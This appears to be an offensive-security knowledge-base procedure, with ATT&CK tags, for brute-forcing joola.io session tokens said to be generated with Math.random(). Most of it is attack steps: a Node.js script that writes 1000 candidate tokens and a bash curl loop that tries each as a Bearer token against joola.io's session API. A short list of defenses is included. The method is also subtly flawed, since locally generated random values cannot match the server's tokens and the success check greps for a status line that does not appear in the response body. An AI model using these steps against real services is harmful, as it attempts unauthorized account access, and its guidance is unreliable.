---
id: proc-brute-force-predictable-tokens
tags:
  - brute-force
  - auth-bypass
  - predictable-tokens
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/simulate-weak-uuid]]'
  - '[[commands/test-token-with-curl]]'
verified: false
platforms:
  - Web
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Brute Force]]'
updated_at: '2025-12-14T17:31:10.766Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Password Guessing]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
---
# Brute-Force-Predictable-Auth-Tokens

## Summary

This procedure exploits predictable authentication tokens generated with Math.random() in applications like joola.io by simulating token patterns and testing them against API endpoints to achieve unauthorized access.

## Description

Once a weakness like Math.random() usage is identified, attackers can predict token formats (e.g., random string + timestamp) and brute-force variations. In joola.io, tokens are used for session authentication, so guessing allows bypassing login. This targets web APIs, requiring knowledge of endpoints and scripting for efficiency. Expected outcomes include session hijacking or account takeover.

## Requirements

1. Knowledge of the vulnerable token generation logic from code review
2. Access to the application's API or session endpoints
3. Node.js environment for simulation
4. curl or similar for HTTP requests

## Defense

Defensive measures and detection strategies:

- Implement rate limiting on auth endpoints
- Use cryptographically secure random (e.g., crypto module in Node.js)
- Log and monitor failed auth attempts for brute-force patterns
- Employ token rotation and short expiration times

## Objectives

1. Generate candidate tokens based on weak RNG patterns
2. Test tokens to gain unauthorized access
3. Validate session or account compromise

## Instructions

### Step 1: Simulate Token Generation

**Context**: Reproduce the weak UUID locally to create a list of predictable tokens.

**Command** ([[commands/simulate-weak-uuid]]):
```javascript
// Run in Node.js
const fs = require('fs');
const tokens = [];
for (let i = 0; i < 1000; i++) {
  const token = Math.random().toString(36).substring(2) + Date.now().toString(36);
  tokens.push(token);
}
fs.writeFileSync('predicted_tokens.txt', tokens.join('\n'));
```

> This generates 1000 tokens mimicking the vuln. Expected output: File with timestamp-influenced tokens.

### Step 2: Test Tokens Against Endpoint

**Context**: Use predicted tokens in auth requests to find a match.

**Command** ([[commands/test-token-with-curl]]):
```bash
while read token; do
  curl -s -H "Authorization: Bearer $token" https://joola.io/api/session | grep -q '200 OK' && echo "Valid token: $token" && break;
done < predicted_tokens.txt
```

> Loops through tokens, testing each. Expected output: Identification of a valid token granting access.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Brute Force]] Brute Force

### Sub-Techniques

- [[Password Guessing]] Password Guessing (adapted for tokens)

## Commands Used

- [[commands/simulate-weak-uuid]]
- [[commands/test-token-with-curl]]

## Tools Used

- None

## Tags

- [[brute-force]]
- [[auth-bypass]]
